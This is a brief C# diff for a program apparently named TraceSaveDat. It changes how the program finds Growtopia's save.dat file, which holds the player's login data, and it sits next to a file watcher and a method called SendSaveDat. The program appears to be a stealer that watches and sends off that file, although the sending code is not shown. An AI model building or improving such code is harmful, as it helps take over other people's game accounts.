@@ -12,8 +12,8 @@ namespace TraceSaveDat
     class Program
     {
 
-        public static string dirPath = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Growtopia",previus;
-        public static string savePath = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Growtopia\\save.dat";
+        public static string dirPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia", previus;
+        public static string savePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +"\\Growtopia\\save.dat";
         public static FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();
         public static void SendSaveDat()
 
